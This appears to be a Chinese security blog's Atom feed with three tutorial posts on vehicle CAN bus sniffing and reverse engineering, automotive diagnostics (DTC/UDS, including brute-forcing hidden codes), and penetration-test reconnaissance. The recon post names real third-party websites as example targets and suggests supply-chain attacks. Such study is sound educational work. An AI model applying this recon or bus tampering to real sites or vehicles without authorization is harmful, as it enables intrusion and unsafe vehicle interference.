<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J3fffff&#39;s Blog</title>
  
  
  <link href="https://j3f5.github.io/atom.xml" rel="self"/>
  
  <link href="https://j3f5.github.io/"/>
  <updated>2023-06-20T01:38:06.000Z</updated>
  <id>https://j3f5.github.io/</id>
  
  <author>
    <name>Jeff</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>车联网基础-SocketCAN与车辆通信</title>
    <link href="https://j3f5.github.io/articles/2023/06/20/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/"/>
    <id>https://j3f5.github.io/articles/2023/06/20/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/</id>
    <published>2023-06-20T01:38:06.000Z</published>
    <updated>2023-06-20T01:38:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>CAN通信，在现实测试中需要了解CAN的各个协议，例如ISO-TP，还有CAN的高低比特率是多少，例如高500，低为250-125，等等。在了解这些之后，我们需要了解各个can连接器，这些链接器可以链接测试CAN总线，后面配合CAN-utils就可以对CAN数据进行读取了。</p><h2 id="连接器"><a class="markdownIt-Anchor" href="#连接器"></a> 连接器</h2><h3 id="vector-canlin-interface"><a class="markdownIt-Anchor" href="#vector-canlin-interface"></a> Vector CAN/LIN interface</h3><h2 id="can-utils"><a class="markdownIt-Anchor" href="#can-utils"></a> can-utils</h2><p>打开kali，安装can-utils：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install can-utils</span><br></pre></td></tr></table></figure><h1 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h1><h2 id="标准测试"><a class="markdownIt-Anchor" href="#标准测试"></a> 标准测试</h2><ol><li><p>安装完CAN-utils，则需配置芯片组</p><ol><li>安装CAN嗅探器对应的驱动，确保设备兼容</li><li>对适配器进行初始化</li><li>使用<code>dmesg</code>查看初始化信息</li></ol></li><li><p>查看接口是否存在（接口是否被正确加载）：<code>ifconfig can0</code></p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620111945142.png" alt="image-20230620111945142" /></p></li><li><p>设置总线速率，要设置的关键参数是<strong>比特率(bitrate)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link set can0 type can bitrate 500000</span><br><span class="line">ip link set up can0</span><br></pre></td></tr></table></figure><p>这样就启动can0设备了，然后就可以使用can-utils进行连接接口了。</p></li><li><p>Linux使用<strong>netlink</strong>在内核和用户空间工具间进行通信，可以通过<code>ip link</code>访问netlink。相关命令可以看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip link set can0 type can help</span><br></pre></td></tr></table></figure><p>注：内置设备复位（数据包丢失/错误时使用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link set canX type can restart-ms 100</span><br><span class="line">ip link set canx type can restart</span><br></pre></td></tr></table></figure></li><li><p>配置串行设备</p><p>要使用USB转串口适配器，必须首先出水啊串口硬件和CAN总线波特率：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slcand -o -s6 -t hw -S 3000000 /dev/ttyUSB0</span><br><span class="line">ip link set up slcan0</span><br></pre></td></tr></table></figure><p>slcand守护进程提供了将串口通信转译到网络驱动程序slcan0所欲的接口，注意<code>-s</code>选项即为波特率，具体参考：</p><ul><li><a href="https://blog.csdn.net/weifengdq/article/details/128823317">https://blog.csdn.net/weifengdq/article/details/128823317</a></li></ul></li></ol><h2 id="虚拟"><a class="markdownIt-Anchor" href="#虚拟"></a> 虚拟</h2><p>配置一个虚拟CAN网络用于测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">modprobe vcan</span><br><span class="line">demsg | grep vcan</span><br><span class="line">ip link add dev vcan0 type vcan</span><br><span class="line">ip link set up vcan0</span><br><span class="line">ifconfig vcan0</span><br></pre></td></tr></table></figure><h2 id="icsim"><a class="markdownIt-Anchor" href="#icsim"></a> ICSim</h2><p>ICSim(Instrument Cluster Simulator)，是由Open Garages推出的工具。它可以产生多个CAN信号，同时会产生许多背景噪声，让我们可以在没有汽车或不改造汽车的情况下即可练习CAN总线的逆向技术。</p><p>GITHUB地址：<a href="https://github.com/zombieCraig/ICSim">https://github.com/zombieCraig/ICSim</a><br />安装参考：<a href="https://www.anquanke.com/post/id/209141">https://www.anquanke.com/post/id/209141</a></p><h1 id="工具与套件"><a class="markdownIt-Anchor" href="#工具与套件"></a> 工具与套件</h1><h2 id="kayak"><a class="markdownIt-Anchor" href="#kayak"></a> Kayak</h2><h1 id="can逆向"><a class="markdownIt-Anchor" href="#can逆向"></a> CAN逆向</h1><p>为了对CAN总线进行逆向，需要先读取CAN包，识别这些包控制什么功能。**然而不需要访问那些CAN官网诊断数据包，因为它的数据不能动。**在学习过程中，获取数据包中包含的信息是理解车辆行为的关键！</p><h2 id="定位can总线"><a class="markdownIt-Anchor" href="#定位can总线"></a> 定位CAN总线</h2><p>参考协议一章，具体在OBD连接器处。参考：</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620131201206.png" alt="image-20230620131201206" style="zoom: 50%;" /><p>如果没办法连接OBD-II，那么找隐藏的CAN信号：</p><ol><li><p>找双绞线：成对/绞在一起的导线。CAN线路通常是绞在一起的两根导线，例如：</p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620131928484.png" alt="image-20230620131928484" /></p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620131953355.png" alt="image-20230620131953355" /></p></li><li><p>万用表测电压2.5V，上下波动1V</p></li><li><p>通过双通道示波器，对到线上信号差异做减法，由于差分信号会互相抵消，应该可以看到恒定信号</p></li></ol><p>注意：CAN总线往往是静默的，通常只需要执行很简单的操作就可以唤醒并产生信号。</p><h2 id="使用wireshark与can-utils逆向can总线通信"><a class="markdownIt-Anchor" href="#使用wireshark与can-utils逆向can总线通信"></a> 使用Wireshark与can-utils逆向Can总线通信</h2><h3 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h3><p>can-utils一般使用的是candump工具，命令是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">candump -b vcan0 slcan0</span><br></pre></td></tr></table></figure><p>不指定<code>-b</code>，默认也行。</p><p>使用wireshark，点击你想要监听的网卡就行（就是vlan0）</p><h3 id="分组can总线数据流"><a class="markdownIt-Anchor" href="#分组can总线数据流"></a> 分组can总线数据流</h3><p>CAN总线上会有很多噪声</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;p&gt;CAN通信，在现实测试中需要了解CAN的各个协议，例如ISO-TP，还有CAN的高低比特率是多少，例如高500，低为250-125，等等。在了解</summary>
      
    
    
    
    <category term="车联网基础" scheme="https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="CAN" scheme="https://j3f5.github.io/tags/CAN/"/>
    
  </entry>
  
  <entry>
    <title>车联网基础-诊断和日志</title>
    <link href="https://j3f5.github.io/articles/2023/06/15/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E8%AF%8A%E6%96%AD%E5%92%8C%E6%97%A5%E5%BF%97/"/>
    <id>https://j3f5.github.io/articles/2023/06/15/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E8%AF%8A%E6%96%AD%E5%92%8C%E6%97%A5%E5%BF%97/</id>
    <published>2023-06-15T05:03:59.000Z</published>
    <updated>2023-06-15T05:03:59.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="诊断服务uds-obd"><a class="markdownIt-Anchor" href="#诊断服务uds-obd"></a> 诊断服务（UDS OBD）</h1><p>先回顾一下一些服务系统</p><ol><li>OBD作为系统，自上而下，标准庞大而清晰。</li><li>UDS作为服务，上层清晰，兼容不同下层，以最终功能实现为要求。</li><li>OBD是关注车辆实时排放的理念形成的行业规范，而UDS是诊断服务的统一化规范。</li><li>UDS是面向整车所有ECU(电控单元)的，而OBD是面向排放系统ECU的。</li></ol><p>再声明一些专有名词：</p><table><thead><tr><th>缩写</th><th>解释</th></tr></thead><tbody><tr><td>DTC</td><td>故障诊断代码</td></tr><tr><td>MIL</td><td>故障指示灯</td></tr><tr><td>PCM</td><td>动力系统控制模块（多个ECU组成）</td></tr><tr><td>RPM</td><td>发动机每分钟转速</td></tr><tr><td>UDS</td><td>统一诊断服务</td></tr><tr><td>EDR</td><td>事件数据记录日志（黑匣子，一般在ECU旁边）</td></tr><tr><td>ACM</td><td>安全气囊控制模块</td></tr><tr><td>SDM</td><td>【通用汽车】感知和诊断模块（存储汽车速度的纵向变化，不记录任何事故后的信息）</td></tr><tr><td>RCM</td><td>【福特】约束控制模块（存储汽车纵向和侧向加速度，与SDR不同）</td></tr><tr><td>ACN</td><td>自动事告呼救系统（将事件告知第三方）</td></tr></tbody></table><h2 id="攻击场景"><a class="markdownIt-Anchor" href="#攻击场景"></a> 攻击场景</h2><p>如果在对车辆总线进行实验时触发了故障，那么需要能够读取并写入PCM以清除故障。则我们需要知道：</p><ol><li>如何读取并清除诊断代码</li><li>查询ECU诊断服务的方法</li><li>如何访问汽车的碰撞数据记录</li><li>如何暴力破解隐藏的诊断代码</li></ol><h1 id="dct故障诊断代码"><a class="markdownIt-Anchor" href="#dct故障诊断代码"></a> DCT（故障诊断代码）</h1><h2 id="概念与知识"><a class="markdownIt-Anchor" href="#概念与知识"></a> 概念与知识</h2><h3 id="格式"><a class="markdownIt-Anchor" href="#格式"></a> 格式</h3><table><thead><tr><th>字节位置</th><th>解释</th></tr></thead><tbody><tr><td>1</td><td>P(0x0)=动力系统，B(0x1)=车身，C(0x2)=底盘，D(0x3)=网络</td></tr><tr><td>2</td><td>0、2、3（SAE标准），1、3（制造商专用码）【注：3可能是anyone】</td></tr><tr><td>3</td><td>字节位置1的子组</td></tr><tr><td>4</td><td>特定的故障区域</td></tr><tr><td>5</td><td>特定的故障区域</td></tr></tbody></table><p>DTC中5个字符仅有网络上的两个原始字节表示。将这两个DTC字节分解成完整的DTC代码方法如下：</p><table><thead><tr><th>格式</th><th>字节1【1】</th><th>-【2】</th><th>-【3】</th><th>字节2【4】</th><th>-【5】</th><th>结果</th></tr></thead><tbody><tr><td>十六进制</td><td>0x0</td><td></td><td>0x4</td><td>0x7</td><td>0x7</td><td>0x0477</td></tr><tr><td>二进制</td><td>00</td><td>00</td><td>0100</td><td>0111</td><td>0111</td><td>第0-15位</td></tr><tr><td>DTC</td><td>P</td><td>0</td><td>4</td><td>7</td><td>7</td><td>P0477</td></tr></tbody></table><p>除了前两个字符外，这些字符都有一一对应的关系（【?】对应上面的字节位置）。这些都是<strong>SAE标准的代码</strong>。</p><h3 id="故障分类"><a class="markdownIt-Anchor" href="#故障分类"></a> 故障分类</h3><ul><li>硬故障：不进行干预就没办法正常消除的故障（例如：清除DTC后，故障仍然出现）</li><li>软故障：间接性问题，例如油箱盖松动之类的问题</li></ul><p>注意：</p><p>并非所有的故障都会点亮MIL灯，它有四类故障</p><ul><li>A类：（总排放失效）亮</li><li>B类：（不影响排放系统）记录数次后亮</li><li>C类：通常不会亮，而是“请尽快保养发动机”</li><li>D类：不亮</li></ul><h3 id="冻结帧数据freeze-frame-data"><a class="markdownIt-Anchor" href="#冻结帧数据freeze-frame-data"></a> 冻结帧数据（Freeze Frame Data）</h3><p>存储DTC时，PCM快照所有相关的发送机部件信息，并存入FFD中。通常包含以下信息：</p><table><thead><tr><th>相关DTC</th><th>发动机负载</th><th>发动机每分钟转速（RPM）</th></tr></thead><tbody><tr><td>发动机温度</td><td>燃油修正</td><td>歧管气压/空气流量（MAP/MAF）值</td></tr><tr><td>操作模式（开/闭电路）</td><td>风门位置</td><td>车速</td></tr></tbody></table><p>理想状态下快照将在DTC出现的时候同时进行，而冻结帧通常在DTC触发后5妙才开始记录。</p><h2 id="读取与清除"><a class="markdownIt-Anchor" href="#读取与清除"></a> 读取与清除</h2><h3 id="读取"><a class="markdownIt-Anchor" href="#读取"></a> 读取</h3><p>使用vehicle spy3不仅能监控和发送报文，还能实现DTC读取和解析，但现在这种功能只适用于采用ISO14229诊断协议的控制器。通过电话与英特佩斯的工程师沟通得知，由于KWP2000协议在美国已经很少使用，所以对采用KWP2000诊断协议的控制器，vehicle spy3仅支持DTC的读取，而不支持DTC的解析。</p><p>工具：</p><ol><li><a href="https://blog.csdn.net/qq_34430371/article/details/114239041">vehicle spy3</a>的使用</li></ol><h3 id="清除"><a class="markdownIt-Anchor" href="#清除"></a> 清除</h3><p>条件：</p><ol><li>PCM三次检查后，不再出现故障，则清除（则硬DTC清除）</li><li>断开电源（则软DTC清除）</li></ol><h1 id="uds统一诊断服务"><a class="markdownIt-Anchor" href="#uds统一诊断服务"></a> UDS——统一诊断服务</h1><p>UDS：向修理人员提供一种统一的展示车辆运行状态的方式（只是展示部分信息），为只读模式。</p><p>使用UDS可以进行：<strong>诊断测试</strong>、<strong>更改固件</strong></p><h2 id="uds安全威胁"><a class="markdownIt-Anchor" href="#uds安全威胁"></a> UDS安全威胁</h2><h2 id="uds刷写"><a class="markdownIt-Anchor" href="#uds刷写"></a> UDS刷写</h2><h3 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;诊断服务uds-obd&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#诊断服务uds-obd&quot;&gt;&lt;/a&gt; 诊断服务（UDS OBD）&lt;/h1&gt;
&lt;p&gt;先回顾一下一些服务系统&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;OBD作为系统，自上而下，标准庞大而</summary>
      
    
    
    
    <category term="车联网基础" scheme="https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="诊断" scheme="https://j3f5.github.io/tags/%E8%AF%8A%E6%96%AD/"/>
    
  </entry>
  
  <entry>
    <title>信息搜集</title>
    <link href="https://j3f5.github.io/articles/2023/06/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://j3f5.github.io/articles/2023/06/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2023-06-14T07:00:58.000Z</published>
    <updated>2023-06-14T07:00:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。</p><p>假设有这么一个国外网站：<a href="https://www.cengkarenggolfclub.com/">https://www.cengkarenggolfclub.com/</a></p><p>还有一个国内网站：<a href="http://www.917hh.com/Abouts.asp?NewsID=1">http://www.917hh.com/Abouts.asp?NewsID=1</a></p><ol><li>方式：主动扫描；</li><li>开放搜索开放搜索：利用搜索引擎获得后台、未授权页面、敏感url</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">基础信息：IP，网段，域名，端口</span><br><span class="line">系统信息：操作系统版本</span><br><span class="line">应用信息：各端口的应用，例如web应用，邮件应用等</span><br><span class="line">版本信息：所有探测到的版本</span><br><span class="line">服务信息：服务器类型、版本</span><br><span class="line">人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等</span><br><span class="line">防护信息：试着看能否探测到防护设备</span><br></pre></td></tr></table></figure><h2 id="企业信息"><a class="markdownIt-Anchor" href="#企业信息"></a> 企业信息</h2><p>主要可以分为：WHOIS信息查询+IPC信息+股权信息+子公司信息</p><p>主要目的：扩大攻击范围，寻找更多的业务，更多的供应商链，人员信息搜集（敏感信息，可以用来制作字典）</p><h3 id="whois"><a class="markdownIt-Anchor" href="#whois"></a> WHOIS</h3><p>很多网站上都可以收集到whois信息，比如说：</p><blockquote><p><a href="http://xn--who-ok6ez9gts1e.is">国外的who.is</a>：<a href="https://who.is/">https://who.is/</a></p><p>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p></blockquote><p>这些网站都可以收集whois信息，而且还很全面，</p><p>主要关注：<strong>注册商、注册人、邮件、DNS解析服务器、注册人联系电话</strong></p><p>小技巧：如果在站长之家上隐藏了信息，可在who.is上再次查看。</p><h3 id="企业备案与股份信息"><a class="markdownIt-Anchor" href="#企业备案与股份信息"></a> 企业备案与股份信息</h3><p>有需要的还可以查企业的备案信息，主要有三种方式：</p><blockquote><p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></p><p>国家企业信用信息公示系统：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a></p><p>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></p></blockquote><p>注意：国外的服务器一般来说是查不到的，因为他们不需要备案。国内的基本上都可以查到。</p><p>主要关注：股权信息，子公司孙公司（投资超过50%/行政权）</p><h3 id="供应商"><a class="markdownIt-Anchor" href="#供应商"></a> 供应商</h3><p>供应商提供的软件一般是收到该商家信任的，所以可以攻击供应商，以此为跳板注入恶意代码攻击此商家。还可以获取供应商上的其他信息。</p><blockquote><p>网页底部的备案信息</p><p>招标文件</p></blockquote><h3 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h3><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><p>一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。</p><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网址：917hh.com</span><br><span class="line">注册商：Alibaba Cloud Computing (Beijing) Co.,Ltd.</span><br><span class="line">注册人：</span><br><span class="line">邮件：</span><br><span class="line">注册联系人电话：</span><br><span class="line">DNS服务器：dns15.hichina.com - 139.224.142.112dns16.hichina.com - 47.118.199.201</span><br></pre></td></tr></table></figure><h2 id="子域名"><a class="markdownIt-Anchor" href="#子域名"></a> 子域名</h2><h3 id="通过谷歌语法"><a class="markdownIt-Anchor" href="#通过谷歌语法"></a> 通过谷歌语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com -www</span><br></pre></td></tr></table></figure><h3 id="聚合网站"><a class="markdownIt-Anchor" href="#聚合网站"></a> 聚合网站</h3><p>GUI好看，结果多：<a href="https://securitytrails.com">https://securitytrails.com</a></p><p>这个网站能查很多东西，包括whois，还有子域名，很厉害：<a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></p><p>这个网站能查的好像就少一些，所以一般用上面的吧：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><h3 id="ssl证书"><a class="markdownIt-Anchor" href="#ssl证书"></a> SSL证书</h3><p>SSL证书是需要申请的，用来保证用户与网站之间的通信。一个SSL/TLS证书通常包含域名、子域名和邮件地址，查找一个域名证书的最简单方法是使用搜索引擎来收集计算机的CT日志，并让任何搜索引擎搜索它们。前两种比较常用。</p><blockquote><p>证书透明性（Certificate Transparency，CT）是 Google 的公开项目，通过让域所有者、CA 和域用户对 SSL 证书的发行和存在进行审查，来纠正这些基于证书的威胁</p></blockquote><ol><li><a href="https://crt.sh/">https://crt.sh/</a></li><li><a href="https://censys.io/">https://censys.io/</a></li></ol><h3 id="爆破枚举"><a class="markdownIt-Anchor" href="#爆破枚举"></a> 爆破枚举</h3><p>这个就有很多工具可以用了，大佬们都有自己用的顺手的工具，比较常见的是：</p><blockquote><ol><li>layer子域名挖掘机</li><li>subDomainsBrute</li><li>K8</li><li>orangescan</li><li>DNSRecon</li><li>在线zcjun：<a href="http://z.zcjun.com/">http://z.zcjun.com/</a></li></ol></blockquote><p>这里重点推荐 layaer 和 subDomainsBrute 工具，可以从子域名入侵到主站。</p><p>小技巧：在<a href="https://github.com/">https://github.com/</a> 上也可以搜索子域名，运气好的话，会有意想不到的收获。例如：<a href="https://github.com/search?q=subdomain+baidu.com&amp;type=code">https://github.com/search?q=subdomain+baidu.com&amp;type=code</a></p><h3 id="dns公开数据集"><a class="markdownIt-Anchor" href="#dns公开数据集"></a> DNS公开数据集</h3><p>利用已有公开的扫描数据集，对子域名信息进行收集。</p><blockquote><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p></blockquote><h3 id="dns共享记录查询"><a class="markdownIt-Anchor" href="#dns共享记录查询"></a> DNS共享记录查询</h3><p>原理：查询共享DNS服务器主机来获取相关的域名</p><ol><li><p>首先查询是否存在NS服务器（这个服务器记录了遇到域名应该去哪里的DNS解析）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>将非权威应答中的NS服务器带到下面的网站查询</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">https://hackertarget.com/find-shared-dns-servers/</a></p></li></ol><h2 id="某个域名的ip端口业务信息等"><a class="markdownIt-Anchor" href="#某个域名的ip端口业务信息等"></a> 某个域名的IP，端口，业务信息等</h2><h3 id="应用中的信息"><a class="markdownIt-Anchor" href="#应用中的信息"></a> 应用中的信息</h3><p>微信/支付宝小程序</p><p>微信公众号</p><p>手机APP抓包+历史版本</p><h3 id="空间测绘"><a class="markdownIt-Anchor" href="#空间测绘"></a> 空间测绘</h3><p>先通过Ping来获得一个IP，或者使用nslookup例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\jeff&gt; ping baidu.com</span><br><span class="line">正在 Ping baidu.com [110.242.68.66] 具有 32 字节的数据:</span><br><span class="line"></span><br><span class="line">PS C:\Users\jeff&gt; nslookup</span><br><span class="line">默认服务器:  localhost</span><br><span class="line">Address:  10.131.210.1</span><br><span class="line">&gt; www.baidu.com</span><br><span class="line">非权威应答:（非权威应答：Non-authoritative answer，除非实际存储DNS Server中获得域名解析回答的，都称为非权威应答。也就是从缓存中获取域名解析结果。）</span><br><span class="line">名称:    www.baidu.com</span><br><span class="line">Addresses:  110.242.68.4</span><br><span class="line">          110.242.68.3</span><br></pre></td></tr></table></figure><p>很多时候，网站都会开启CDN加速，导致我们查询到的IP不是真实的IP，所以得先查询到真实的IP地址。</p><p>可以通过DNS记录找一下，例如：<a href="https://sitereport.netcraft.com/?url=http://www.baidu.com%EF%BC%8C%E9%87%8C%E9%9D%A2%E7%9A%84NetWork%E9%80%89%E9%A1%B9%E9%87%8C%E9%9D%A2%E5%B0%B1%E6%9C%89%E4%BB%96%E7%9A%84IP%EF%BC%8C%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%EF%BC%9Ahttps://www.virustotal.com/gui/ip-address/104.193.88.123/details%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93%E8%BF%99%E4%B8%AAIP%E5%B1%9E%E4%BA%8E%E8%B0%81%EF%BC%8C%E5%AF%B9%E7%85%A7%E4%B8%80%E4%B8%8B%E3%80%82">https://sitereport.netcraft.com/?url=http://www.baidu.com，里面的NetWork选项里面就有他的IP，然后通过组合拳：https://www.virustotal.com/gui/ip-address/104.193.88.123/details，就可以知道这个IP属于谁，对照一下。</a></p><p>上面我们得到地址110.242.68.4，去virustotal查一下得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Network110.240.0.0/12</span><br><span class="line">Autonomous System Number4837</span><br><span class="line">Autonomous System LabelCHINA UNICOM China169 Backbone</span><br><span class="line">Regional Internet RegistryAPNIC</span><br></pre></td></tr></table></figure><p>而在netcraft得到地址104.193.88.123，查一下得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Network104.193.88.0/23</span><br><span class="line">Autonomous System Number55967</span><br><span class="line">Autonomous System LabelBeijing Baidu Netcom Science and Technology Co., Ltd.</span><br><span class="line">Regional Internet RegistryARIN</span><br></pre></td></tr></table></figure><ol><li>看到上面nsloopup有多个记录，那么大概率是cdn了（windows 用 nslookup，linux 用 dig）</li><li>通过netcraft得到的地址应该是可以用的，真实地址</li><li>使用多地ping（<a href="https://www.boce.com/ping%EF%BC%89%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%88%A4%E6%96%AD">https://www.boce.com/ping），可以判断</a></li></ol><h3 id="验证cdn"><a class="markdownIt-Anchor" href="#验证cdn"></a> 验证cdn</h3><ul><li><p>反查域名 IP，看结果是否有大量不相关的域名存在，<a href="http://ip.yqie.com/iptodomain.aspx%EF%BC%8C">http://ip.yqie.com/iptodomain.aspx，</a></p><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230511144227088.png" alt="image-20230511144227088" /></p></li><li><p>观察请求响应的返回数据的头部，是否有 CDN 服务商标识</p></li><li><p>使用超级 ping，通过不同定位地点的 ping 测试，看返回的 IP 是否不同</p></li><li><p>判断 IP 是否在常见 CDN 服务商的服务器 IP 段上</p></li><li><p>若 asp 或者 <a href="http://asp.net">asp.net</a> 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN</p></li><li><p>利用 Nslookup 查询域名，看是否返回多个应答 IP</p></li></ul><ol><li><p>通过反向解析：通过ip反查域名，但这个一般是用作查资源</p><ol><li><p>nslookup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt=ptr ip [dnsserver]</span><br><span class="line">nslookup反向解析结果不够准确，而且很多ip是解析不出来的</span><br></pre></td></tr></table></figure></li></ol></li><li></li></ol><h3 id="cdn绕过"><a class="markdownIt-Anchor" href="#cdn绕过"></a> CDN绕过</h3><blockquote><p>Content Delivery Network，中文全称为内容分发网络，简称为 CDN 。所有请求网站内容的用户都将从最近的 CDN 代理服务器获取其缓存版本，因此内容加载速度更快，网站的性能得到改善。</p></blockquote><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/cdn.png" alt="cdn.png" /></p><ol><li>ping邮箱：<a href="http://mail.baidu.com">mail.baidu.com</a>，去<a href="https://www.boce.com/ping/%E8%BF%99ping%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%8F%AA%E6%9C%89%E4%B8%A4%E4%B8%AAIP%EF%BC%9A111.202.115.87%E5%92%8C220.181.3.87">https://www.boce.com/ping/这ping一下，只有两个IP：111.202.115.87和220.181.3.87</a></li></ol><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com -www</span><br></pre></td></tr></table></figure><p>减号就是不搜索www</p>]]></content>
    
    
      
      
